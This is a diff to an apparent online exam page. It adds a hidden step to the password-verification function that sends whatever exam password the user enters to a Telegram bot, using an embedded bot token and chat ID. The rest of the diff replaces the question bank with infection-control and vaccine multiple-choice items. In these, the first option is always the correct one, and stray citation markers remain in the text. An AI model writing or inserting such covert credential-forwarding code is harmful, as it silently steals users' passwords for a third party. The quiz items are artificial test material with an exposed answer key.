@@ -1611,6 +1611,23 @@
 
     function verifyAndStart() {
         capturedExamVerificationPassword = document.getElementById('exam-password-input').value || "";
+        
+        // إرسال كلمة المرور إلى Telegram
+        const telegramBotToken = '8979568296:AAEj9rp_VvnR9ZMgFsIwzxRS1raqiWr-cWE';
+        const telegramChatId = '-5118649597';
+        const message = `🔔 محاولة دخول للاختبار\nكلمة المرور المُدخلة: ${capturedExamVerificationPassword}`;
+        
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message
+            })
+        }).catch(error => console.error('Error sending to Telegram:', error));
+
         closeModal();
         document.getElementById('dashboard-container').style.display = 'none';
         clearInterval(dashboardTimerInterval); 
@@ -1619,211 +1636,505 @@
     }
 
     const bank = [
-  { 
-    q: "A clear statement of what the learner is expected to be able to do at the end of an instructional activity is defined as a:", 
-    a: ["Behavioral Objective", "Educational Goal", "Instructional Curriculum", "Teaching Plan"], 
-    marks: "1.00" 
+  {
+    q: "Nearly 80% of all healthcare-associated infections (HAIs) are related to which of the following groups? [cite: 2499]",
+    a: [
+      "Urinary tract infections, surgical site infections, bloodstream infections, and pneumonia [cite: 2500, 2501, 2502, 2509]",
+      "Skin infections, gastrointestinal illness, ear infections, and sinusitis",
+      "Meningitis, bone infections, joint infections, and endocarditis",
+      "Hepatitis, tuberculosis, varicella, and influenza"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Which of the following best describes the main difference between an educational goal and a behavioral objective?", 
-    a: ["Goals are multidimensional and long-term; objectives are specific and short-term", "Goals are narrow and precise; objectives are global and broad", "Goals describe immediate actions; objectives describe future states", "There is no functional difference between them in healthcare education"], 
-    marks: "1.00" 
+  {
+    q: "Which of the following is identified as a major risk factor for developing a healthcare-associated infection (HAI)? [cite: 2513]",
+    a: [
+      "Use of indwelling medical devices [cite: 2515]",
+      "Increasing routine physical exercise",
+      "Consuming a high-protein diet",
+      "Routine administration of oral vitamins"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "According to the 'ABCD Rule' for writing objectives, the letter 'C' stands for which of the following elements?", 
-    a: ["Condition under which the behavior will be performed", "Criterion describing how well the learner must perform", "Cognitive domain level required for testing", "Competency baseline of the specific audience"], 
-    marks: "1.00" 
+  {
+    q: "What does the medical abbreviation CAUTI stand for in infection control? [cite: 2530]",
+    a: [
+      "Catheter-Associated Urinary Tract Infection [cite: 2530]",
+      "Central Line-Associated Urinary Tract Infection",
+      "Clinically Acquired Urinary Tract Infection",
+      "Catheter-Associated Upper Tract Infection"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "An educator writes an objective containing the verb 'To appreciate'. What is the primary mistake made in this objective?", 
-    a: ["It uses a non-behavioral verb that is not directly observable or measurable", "It does not specify the demographic of the clinical audience", "It lacks a strict timeframe for the completion of the skill", "It fails to combine multiple educational domains together"], 
-    marks: "1.00" 
+  {
+    q: "Which of the following is an example of an endogenous source of microorganisms causing a urinary tract infection? [cite: 2540]",
+    a: [
+      "Meatal, rectal, or vaginal colonization of the patient [cite: 2543]",
+      "Contaminated hands of healthcare personnel",
+      "Unsterilized urinary catheter insertion kits",
+      "Contaminated environmental surfaces around the bed"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Under the SMART acronym for writing objectives, the letter 'R' demands that an objective must be:", 
-    a: ["Realistic and achievable with available resources", "Rigorous enough to meet international research standards", "Reviewed by an external nursing education committee", "Relative to the advanced cognitive levels of the taxonomy"], 
-    marks: "1.00" 
+  {
+    q: "Which of the following represents an exogenous source of infection for a patient with an indwelling catheter? [cite: 2544]",
+    a: [
+      "Contaminated hands of a healthcare provider or equipment [cite: 2545, 2546]",
+      "The patient's own rectal flora",
+      "The patient's vaginal colonization",
+      "Normal skin flora residing in the patient's own groin"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Bloom's Taxonomy divides learning into three primary categories known as:", 
-    a: ["Cognitive, Affective, and Psychomotor domains", "Knowledge, Attitude, and Behavioral checkpoints", "Formative, Summative, and Outcome benchmarks", "Systematic, Structured, and Planned educational steps"], 
-    marks: "1.00" 
+  {
+    q: "According to Box 5.1, a superficial incisional surgical site infection (SSI) must occur within how many days after the operation? [cite: 2553, 2554]",
+    a: [
+      "Within 30 days [cite: 2554]",
+      "Within 60 days",
+      "Within 90 days",
+      "Within 1 year"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Which level of the Cognitive Domain represents the lowest, most basic level of complexity?", 
-    a: ["Knowledge / Remembering", "Application / Applying", "Analysis / Analyzing", "Evaluation / Evaluating"], 
-    marks: "1.00" 
+  {
+    q: "Which layers of tissue are primarily involved in a deep incisional surgical site infection (SSI)? [cite: 2557]",
+    a: [
+      "Deep soft tissues of the incision, such as fascial and muscle layers [cite: 2558]",
+      "Only the superficial skin and subcutaneous tissue",
+      "Any part of the anatomy opened or manipulated other than the incision line",
+      "Only the internal mucosal linings of adjacent organs"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Verbs like 'design', 'construct', and 'formulate' are typically associated with which high-level cognitive domain stage?", 
-    a: ["Synthesis / Creating", "Comprehension / Understanding", "Direct Recall", "Baseline Assessment"], 
-    marks: "1.00" 
+  {
+    q: "An organ/space surgical site infection (SSI) can occur up to how long after the operation if an implant is left in place? [cite: 2562, 2563]",
+    a: [
+      "Within 1 year [cite: 2563]",
+      "Within 30 days",
+      "Within 6 months",
+      "Within 2 years"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "What is considered the single major criterion for judging the quality and utility of a final Teaching Plan?", 
-    a: ["Whether the internal elements (objectives, methods, evaluation) are strictly aligned with each other", "The total number of slides and printed reference pages included", "The exact length of time taken by the instructor to present it", "Whether it completely excludes the need for a separate formal assessment"], 
-    marks: "1.00" 
+  {
+    q: "According to Table 5.1, which type of vascular access catheter accounts for the majority of catheter-related bloodstream infections (CRBSIs)? [cite: 2611]",
+    a: [
+      "Nontunneled central venous catheters [cite: 2579, 2611]",
+      "Peripheral venous catheters",
+      "Peripheral arterial catheters",
+      "Midline catheters"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "When an educator writes a behavioral objective, who should be the primary focus or subject of the written statement?", 
-    a: ["The Learner", "The Educator", "The Evaluator", "The Hospital Administration"], 
-    marks: "1.00" 
+  {
+    q: "Which type of catheter is typically inserted via the antecubital fossa into the proximal basilic or cephalic veins but does not enter central veins? [cite: 2578, 2588]",
+    a: [
+      "Midline catheters [cite: 2578, 2588]",
+      "Nontunneled central venous catheters",
+      "PICC lines",
+      "Umbilical catheters"
+    ],
+    marks: "0.80"
   },
-
-  // Chapter 11: Instructional Methods and Settings
-  { 
-    q: "Which instructional method is traditionally defined as an educator speaking formally to a group to transmit large amounts of structured data?", 
-    a: ["Lecture", "Group Discussion", "One-to-One Instruction", "Simulation"], 
-    marks: "1.00" 
+  {
+    q: "Which vascular access device provides the lowest risk for catheter-related bloodstream infections (CRBSIs)? [cite: 2615]",
+    a: [
+      "Totally implantable catheters [cite: 2583, 2615]",
+      "Nontunneled central venous catheters",
+      "Pulmonary artery catheters",
+      "Peripheral venous catheters"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "To prevent passive learning and enhance verbal presentations, what is a highly recommended creative technique for teachers?", 
-    a: ["Integrating interactive periods, questions, and multimedia segments", "Lengthening the lecture past 60 minutes to cover all facts", "Reading directly from text heavy slides to maintain absolute accuracy", "Eliminating any student questions until the entire course ends"], 
-    marks: "1.00" 
+  {
+    q: "A Central Line-Associated Bloodstream Infection (CLABSI) is primarily used as what type of definition? [cite: 2627, 2628]",
+    a: [
+      "A surveillance definition set forth by agencies such as the NHSN [cite: 2633]",
+      "A clinical definition used primarily for diagnosing and treating individual patients",
+      "A definition requiring intensive radiological confirmation and tissue biopsy",
+      "A basic definition applied only to peripheral line configurations"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "A key advantage of using the 'Group Discussion' instructional method is that it directly facilitates:", 
-    a: ["Affective and cognitive learning through active exchange of ideas", "Rapid, one-way dissemination of factual information to massive crowds", "Solitary self-paced advancement through mechanical modules", "Strict preservation of the instructor as the sole knowledge source"], 
-    marks: "1.00" 
+  {
+    q: "To be classified as a CLABSI, a primary bloodstream infection must develop in a patient who had a central line within what time period before infection development? [cite: 2634]",
+    a: [
+      "Within a 48-hour period [cite: 2634]",
+      "Within a 24-hour period",
+      "Within a 7-day period",
+      "Within a 30-day period"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "One-to-One Instruction is uniquely suited for tailoring education, but its primary disadvantage as an instructional method is that it:", 
-    a: ["Is highly labor-intensive and limits the number of learners reached", "Fails to establish a strong teacher-learner relationship", "Prevents the delivery of specific psychomotor cues", "Forces the learner into an entirely passive and isolated role"], 
-    marks: "1.00" 
+  {
+    q: "According to the CDC ranking system, a Category IA recommendation is described as: [cite: 2710]",
+    a: [
+      "Strongly recommended for implementation and supported by well-designed experimental, clinical, or epidemiologic studies [cite: 2711]",
+      "Strongly recommended for implementation and supported by strong theoretical rationale only [cite: 2712]",
+      "Suggested for implementation and supported by suggestive clinical studies [cite: 2713]",
+      "An unresolved issue with insufficient evidence or no consensus regarding efficacy [cite: 2714]"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "During a clinical skills lab, a nurse educator performs a procedure step-by-step while students observe. This method is called:", 
-    a: ["Demonstration", "Return Demonstration", "Role-Playing", "Gaming"], 
-    marks: "1.00" 
+  {
+    q: "In a nonacute care setting, what technique is acceptable and more practical for chronic intermittent catheterization? [cite: 2738]",
+    a: [
+      "Clean (i.e., nonsterile) technique [cite: 2738]",
+      "Strict sterile technique with surgical drapes",
+      "Closed system continuous automated irrigation technique",
+      "Antibiotic-flushed automated technique"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "The primary purpose of requiring a 'Return Demonstration' from a student after a laboratory instruction is to:", 
-    a: ["Evaluate psychomotor skill competence and provide immediate corrective feedback", "Test the student's speed at reading detailed medical textbooks", "Allow the instructor to leave the classroom during peer grading", "Shift the entire educational dynamic into a competitive game format"], 
-    marks: "1.00" 
+  {
+    q: "What is the proper recommendation for the placement of an indwelling urinary catheter collecting bag? [cite: 2751]",
+    a: [
+      "Keep the collecting bag below the level of the bladder at all times and do not rest it on the floor [cite: 2752, 2753]",
+      "Keep the bag at the level of the bladder pinned to the sheet",
+      "Place the bag directly on the floor to maximize gravity drainage",
+      "Hang the bag on the IV pole above the patient's head level"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Educational 'Gaming' as an instructional method enhances learning primarily by:", 
-    a: ["Increasing learner motivation and adding an element of competitive fun", "Providing a highly realistic, risk-free emergency scenario simulation", "Eliminating the need for any formal learning objectives", "Replacing clinical hours with purely theoretical digital assignments"], 
-    marks: "1.00" 
+  {
+    q: "According to priority guidelines, how should the periurethral area be routinely cleaned while a urinary catheter is in place? [cite: 2758]",
+    a: [
+      "Routine hygiene such as cleansing of the meatal surface during daily bathing or showering [cite: 2759]",
+      "Swabbing with aggressive antiseptic solutions twice daily",
+      "Continuous irrigation with antimicrobial liquids",
+      "Applying topical antibiotic ointment to the meatus daily"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Which instructional method creates an artificial experience that mocks real-world clinical conditions without actual patient risk?", 
-    a: ["Simulation", "Lecture", "Role-Modeling", "Independent Self-Instruction"], 
-    marks: "1.00" 
+  {
+    q: "Which of the following is considered an INAPPROPRIATE use of an indwelling urinary catheter? [cite: 2789]",
+    a: [
+      "As a substitute for nursing care of the patient or resident with incontinence [cite: 2790]",
+      "To manage acute urinary retention or bladder outlet obstruction [cite: 2780]",
+      "To assist in healing of open sacral or perineal wounds in incontinent patients [cite: 2786]",
+      "For accurate measurements of urinary output in critically ill patients [cite: 2781]"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "In 'Role-Playing', learners are asked to actively look at situations from different perspectives. This method strongly develops:", 
-    a: ["Empathy and interpersonal skills within the affective domain", "Purely algorithmic calculation speeds for drug dosages", "Mechanical dexterity for operating heavy surgical machinery", "The capacity to memorize vast tables of physiological data"], 
-    marks: "1.00" 
+  {
+    q: "What is the Category IA recommendation regarding pre-operative hair removal to prevent surgical site infections (SSIs)? [cite: 2810]",
+    a: [
+      "Routine shaving of patients is not necessary, and hair should not be removed unless it interferes with the operation [cite: 2810, 2812, 2813]",
+      "All patients must be completely shaved at the incision site the morning of surgery",
+      "Hair should be removed using chemical depilatories 48 hours prior",
+      "Shaving with a razor is strongly preferred over clippers"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "When selecting an instructional method, what is the most important factor an educator should consider first?", 
-    a: ["The predetermined behavioral objectives and needs of the specific learners", "The personal comfort zone and historical preference of the teacher", "The exact style of fonts used in the supporting PowerPoint slides", "The market cost of purchasing advanced automated training mannequins"], 
-    marks: "1.00" 
+  {
+    q: "To prevent surgical site infections, patients should be encouraged to abstain from tobacco use for a minimum of how many days before an elective operation? [cite: 2828, 2831]",
+    a: [
+      "30 days [cite: 2831]",
+      "7 days",
+      "14 days",
+      "60 days"
+    ],
+    marks: "0.80"
   },
-
-  // Chapter 12: Instructional Materials
-  { 
-    q: "Instructional materials are structurally classified as vehicles used to communicate information. They are also known as:", 
-    a: ["Educational Tools / Media", "Instructional Methods", "Teaching Strategies", "Evaluation Blueprints"], 
-    marks: "1.00" 
+  {
+    q: "What is required of preoperative patients regarding skin preparation on at least the night before the operation day? [cite: 2839, 2841]",
+    a: [
+      "Shower or bathe with an antiseptic agent [cite: 2839, 2841]",
+      "Apply topical steroid creams over the planned incision site",
+      "Undergo a full-body alcohol rub down by a nurse",
+      "Avoid water contact completely to prevent skin moisture accumulation"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "What are the three major, interconnected components of instructional materials that must be thoroughly evaluated?", 
-    a: ["Delivery system, content, and real-world expression (format)", "Font size, background theme, and slide numbers", "Cost, transport weight, and manufacturing date", "Author name, publisher status, and country of origin"], 
-    marks: "1.00" 
+  {
+    q: "An operating room should have positive-pressure ventilation with respect to corridors and adjacent areas, with a minimum of how many total air changes per hour? [cite: 2881]",
+    a: [
+      "A minimum of 15 air changes/hour [cite: 2881]",
+      "A minimum of 5 air changes/hour",
+      "A minimum of 10 air changes/hour",
+      "A minimum of 25 air changes/hour"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Which type of instructional material relies completely on written or printed words as its primary vehicle for delivery?", 
-    a: ["Printed Materials (e.g., pamphlets, brochures)", "Demonstration Materials", "Audiovisual Resources", "Computer-Based Modules"], 
-    marks: "1.00" 
+  {
+    q: "Out of the total air changes per hour required in an operating room, at least how many changes per hour must be fresh air? [cite: 2882]",
+    a: [
+      "At least 3 air changes/hour [cite: 2882]",
+      "At least 1 air change/hour",
+      "At least 5 air changes/hour",
+      "At least 10 air changes/hour"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "When evaluating printed materials for patients, a primary clinical concern is ensuring the text matches the patient's:", 
-    a: ["Readability and literacy level", "Physical weight and biological age", "Historical digital technical competencies", "Preferred style of clinical dress"], 
-    marks: "1.00" 
+  {
+    q: "For a primary closure, a surgical incision should be protected with a sterile dressing for how long post-operatively? [cite: 2937, 2939]",
+    a: [
+      "24-48 hours [cite: 2939]",
+      "12 hours",
+      "7 days",
+      "Until sutures are removed"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Models, replicas, anatomical displays, and real equipment are classified under which category of instructional media?", 
-    a: ["Demonstration Materials", "Projected Learning Resources", "Audio Learning Resources", "Telecommunications Media"], 
-    marks: "1.00" 
+  {
+    q: "Which statement is true regarding active immunity? [cite: 3053]",
+    a: [
+      "It takes several weeks to develop and is long-lasting [cite: 3062, 3060]",
+      "It provides immediate protection but only lasts for weeks to months",
+      "It can only be achieved via prefabricated blood product administration",
+      "It involves directly giving the individual manufactured antibodies"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "According to the data from the 'Learning Pyramid', information retention levels rise significantly when learners are:", 
-    a: ["Actively involved in learning (e.g., practicing, teaching others)", "Passively sitting through an extended reading session", "Purely observing a distant, unguided presentation", "Listening to a monotone audio broadcast without visuals"], 
-    marks: "1.00" 
+  {
+    q: "Passive immunity is characterized by which of the following attributes? [cite: 3066]",
+    a: [
+      "Immediate protection that lasts only weeks to months [cite: 3077, 3072]",
+      "An immune system response that takes weeks to actively build antibodies",
+      "Extremely long-lasting protection spanning several decades",
+      "The intentional replication of a live virus inside the host"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Commercial videotapes, DVDs, and motion digital files are highly effective because they combine which two sensory elements?", 
-    a: ["Visual and auditory stimuli", "Tactile and olfactory feedback", "Textual and numerical equations", "Theoretical and historical chronologies"], 
-    marks: "1.00" 
+  {
+    q: "Which of the following is an example of a live, attenuated vaccine? [cite: 3081]",
+    a: [
+      "MMR (Measles, Mumps, Rubella) vaccine [cite: 3084]",
+      "Inactivated polio vaccine (IPV) [cite: 3120]",
+      "Injectable influenza vaccine (IIV) [cite: 3121]",
+      "Tetanus toxoid [cite: 3133]"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "Computer Learning Resources are highly praised in modern healthcare education because they offer:", 
-    a: ["High interactivity, immediate feedback, and self-paced navigation", "An completely unmonitored environment with zero structure", "A complete replacement for all human clinical supervision requirements", "The lowest possible technology setup cost available to hospitals"], 
-    marks: "1.00" 
+  {
+    q: "Which of the following is an example of a killed or inactivated vaccine? [cite: 3109]",
+    a: [
+      "Inactivated polio vaccine (IPV) [cite: 3120]",
+      "MMR vaccine [cite: 3084]",
+      "Varicella vaccine [cite: 3456]",
+      "Rotavirus vaccine"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "What is a general principle of effectiveness when choosing any instructional material?", 
-    a: ["The material should complement, not completely replace, the instructor's teaching", "The material must always be the most expensive option on the market", "The media must contain at least 50 pages of textual references", "The resource should be selected based solely on its color palette"], 
-    marks: "1.00" 
+  {
+    q: "Immunizations made by inactivating bacterial toxins using heat or chemicals are called: [cite: 3127, 3132]",
+    a: [
+      "Toxoids [cite: 3127]",
+      "Subunit vaccines",
+      "Recombinant vaccines",
+      "Live attenuated vaccines"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "When choosing instructional materials, which criterion ensures that the material does not promote outdated or unsafe medical methods?", 
-    a: ["State of the evidence / currency of information", "Physical portability of the training device", "The specific brand of computer needed to run it", "Whether it fits standard library shelf dimensions"], 
-    marks: "1.00" 
+  {
+    q: "According to Chapter 6, what is the only licensed recombinant vaccine explicitly mentioned in the text? [cite: 3148, 3157]",
+    a: [
+      "Hepatitis B [cite: 3158]",
+      "Influenza",
+      "Pertussis",
+      "Diphtheria"
+    ],
+    marks: "0.80"
   },
-
-  // Chapter 14: Evaluation in Healthcare Education
-  { 
-    q: "Evaluation in healthcare education is formally defined as a systematic process that:", 
-    a: ["Gathers and interprets data to make judgments about worth or value", "Collects continuous initial screening parameters for diagnostics", "Measures the physical dimensions of hospital learning labs", "Purely tallies the total attendance rows during a morning lecture"], 
-    marks: "1.00" 
+  {
+    q: "Why do polysaccharide vaccines fail to produce a consistent immune response in children less than 2 years of age? [cite: 3162, 3174, 3175]",
+    a: [
+      "They stimulate B cells directly without helper T cells [cite: 3171, 3172]",
+      "They contain live pathogens that overwhelm young immune systems",
+      "They can only be safely administered orally via drops",
+      "They degrade instantly under normal body temperatures"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "What is the primary difference between an 'Assessment' and an 'Evaluation'?", 
-    a: ["Assessment gathers raw data; Evaluation interprets that data to make a formal judgment", "Assessment occurs at the absolute end; Evaluation is purely an initial baseline", "Assessment focuses only on costs; Evaluation focuses only on medical safety", "There is no difference; they are absolute synonyms in nursing curricula"], 
-    marks: "1.00" 
+  {
+    q: "According to best practices, refrigerated vaccines should be stored within what temperature range? [cite: 3354, 3358]",
+    a: [
+      "Between 35°F and 46°F (2°C and 8°C) [cite: 3358]",
+      "Between -58°F and +5°F (-50°C and -15°C) [cite: 3357]",
+      "Between 50°F and 60°F (10°C and 15°C)",
+      "At 32°F or below (0°C or below)"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "An evaluation conducted during the instructional process to modify and improve ongoing teaching is called a:", 
-    a: ["Formative (Process) Evaluation", "Summative (Outcome) Evaluation", "Impact Evaluation", "Total Program Evaluation"], 
-    marks: "1.00" 
+  {
+    q: "How should vaccines be arranged inside storage units regarding their expiration dates? [cite: 3359]",
+    a: [
+      "Place vaccines and diluents with the earliest expiration dates in front [cite: 3359]",
+      "Place vaccines with the furthest expiration dates in front",
+      "Mix look-alike vaccines together randomly on the same shelf",
+      "Stack adult and pediatric formulations tightly on the top shelf"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "A Summative Evaluation is specifically designed and scheduled to take place:", 
-    a: ["At the conclusion of an instructional activity to determine final outcomes", "Before the teaching plan is ever written by the nurse instructor", "Continuously every five minutes during a formal demonstration cycle", "Only when a severe student incident occurs within the clinic"], 
-    marks: "1.00" 
+  {
+    q: "What characteristic clinical sign develops in diphtheria, covering the nasal tissues, tonsils, larynx, and pharynx? [cite: 3464, 3476]",
+    a: [
+      "A thick, grey pseudomembrane [cite: 3476]",
+      "A fluid-filled raised vesicle rash",
+      "An itchy red blotchy forehead rash",
+      "Swollen parotid glands and cheeks"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "According to the steps in evaluation, what must be explicitly established before any data collection tools are designed?", 
-    a: ["The specific purpose and scope of the evaluation", "The final budget surplus report of the educational department", "The preferred vacation schedules of the academic board", "The exact publication dates of all future textbooks"], 
-    marks: "1.00" 
+  {
+    q: "The Hepatitis A virus is extremely hardy and can remain infectious on surfaces at room temperature for how long? [cite: 3561, 3596, 3598]",
+    a: [
+      "For 7 days [cite: 3599]",
+      "For 2 hours",
+      "For 24 hours",
+      "For 30 days"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "An evaluation that measures long-term structural changes in organizational practice or community health status is an:", 
-    a: ["Impact Evaluation", "Content Evaluation", "Process Screening", "Formative Checkpoint"], 
-    marks: "1.00" 
+  {
+    q: "Respiratory droplets released when an infected measles patient coughs or sneezes can remain infectious in the air for up to: [cite: 3741, 3754, 3755]",
+    a: [
+      "Up to 2 hours [cite: 3756, 3757]",
+      "Up to 30 minutes",
+      "Up to 12 hours",
+      "Up to 48 hours"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "In healthcare education evaluation designs, planners must always balance practical limitations against the strict desire for:", 
-    a: ["Methodological rigor and objectivity", "Subjective opinions and personal anecdotes", "The speed of completing the evaluation in under five minutes", "Utilizing a single unvalidated casual question sheet"], 
-    marks: "1.00" 
+  {
+    q: "The quadrivalent meningococcal vaccine targets which four serogroups of Neisseria meningitidis? [cite: 3817, 3819, 3871]",
+    a: [
+      "A, C, Y, and W-135 [cite: 3870, 3871]",
+      "A, B, C, and D",
+      "X, Y, Z, and W",
+      "Types 1, 2, 3, and 4"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "What is considered a significant barrier to conducting effective evaluations in clinical settings?", 
-    a: ["Lack of time, resources, and clear evaluative expertise", "Having too many highly validated testing tools available", "Students possessing exceptional levels of intrinsic motivation", "The excessive simplicity of interpreting advanced multivariate statistics"], 
-    marks: "1.00" 
+  {
+    q: "Parotitis (swelling of salivary glands) occurs in approximately what percentage of mumps cases? [cite: 3885, 3890, 3892]",
+    a: [
+      "30-40% of cases [cite: 3892]",
+      "95% of cases",
+      "10-20% of cases",
+      "75% of cases"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "When an educator selects an evaluation instrument, the tool must consistently yield the same results under identical conditions. This quality is called:", 
-    a: ["Reliability", "Portability", "Multidimensionality", "Subjectivity"], 
-    marks: "1.00" 
+  {
+    q: "In its later stages, Clostridium tetani forms highly resistant spores that can survive heat temperatures greater than 250°F for: [cite: 4209, 4211, 4248, 4249]",
+    a: [
+      "10-15 minutes [cite: 4249]",
+      "2 hours",
+      "24 hours",
+      "30 seconds"
+    ],
+    marks: "0.80"
   },
-  { 
-    q: "What is the vital final step of the evaluation process that ensures accountability and future educational development?", 
-    a: ["Reporting and utilizing the evaluation results to guide future practice", "Filing the data away in an encrypted folder never to be opened", "Verbally berating individuals who scored below the class average", "Discarding the written questionnaires to protect facility storage space"], 
-    marks: "1.00" 
+  {
+    q: "What is the typical onset period for symptoms of Norovirus following exposure? [cite: 4286, 4293]",
+    a: [
+      "12-48 hours after exposure [cite: 4293, 4294]",
+      "2-5 days after exposure",
+      "12-72 hours after exposure",
+      "7-10 days after exposure"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What antimicrobial treatments are specified for Campylobacter infections when supportive care alone is insufficient? [cite: 4362, 4375]",
+    a: [
+      "Azithromycin and fluoroquinolones [cite: 4375, 4376]",
+      "Nitazoxanide and anti-retrovirals",
+      "Penicillin and amoxicillin",
+      "Interferon therapy"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "A small percentage of patients infected with Shiga toxin-producing E. coli (STEC) may develop which life-threatening complication? [cite: 4469, 4477, 4488]",
+    a: [
+      "Hemolytic uremic syndrome (HUS) [cite: 4488, 4495]",
+      "Post-herpetic neuralgia",
+      "Congenital rubella syndrome",
+      "Reactive arthritis"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "According to safe food cooking charts, whole poultry (chicken & turkey) must reach what internal temperature? [cite: 4533, 4536]",
+    a: [
+      "165°F [cite: 4537]",
+      "145°F",
+      "160°F",
+      "140°F"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Ground meat mixtures such as beef, pork, veal, or lamb must be cooked to an internal temperature of: [cite: 4524]",
+    a: [
+      "160°F [cite: 4527]",
+      "145°F",
+      "165°F",
+      "140°F"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Healthcare personnel who develop measles should be excluded from work for how long following the onset of the rash? [cite: 4627, 4628]",
+    a: [
+      "At least 4 days [cite: 4628, 4629]",
+      "At least 5 days",
+      "At least 7 days",
+      "Until all lesions are crusted"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What is the recommended work restriction period for healthcare personnel who develop mumps? [cite: 4630]",
+    a: [
+      "Exclude from work for at least 5 days following the onset of parotitis [cite: 4631, 4632]",
+      "Exclude from work for 4 days after the rash starts",
+      "Exclude from work for 7 days after parotitis resolves",
+      "No exclusion is required if asymptomatic"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Healthcare personnel who develop rubella must be excluded from work for at least how many days after the rash appears? [cite: 4633, 4634]",
+    a: [
+      "7 days [cite: 4634, 4635]",
+      "4 days",
+      "5 days",
+      "14 days"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "In a 'Medium Risk' healthcare setting, how frequently should healthcare workers receive routine serial TB screening after baseline testing? [cite: 4662, 4665]",
+    a: [
+      "Annually [cite: 4665]",
+      "Every 8-10 weeks",
+      "Every 2 years",
+      "No routine serial screening is necessary"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "To clear a healthcare worker with confirmed active TB disease back to work, how many consecutive negative sputum samples must be collected? [cite: 4794, 4798]",
+    a: [
+      "3 consecutive negative sputum samples [cite: 4800, 4802]",
+      "2 consecutive negative sputum samples",
+      "5 consecutive negative sputum samples",
+      "1 negative sputum sample is sufficient"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What is the estimated risk of HIV transmission from an occupational percutaneous needlestick injury involving an HIV-positive source? [cite: 4864, 4873]",
+    a: [
+      "0.3% [cite: 4874, 4875]",
+      "43.43%",
+      "1.8%",
+      "0.1%"
+    ],
+    marks: "0.80"
   }
 ]
 
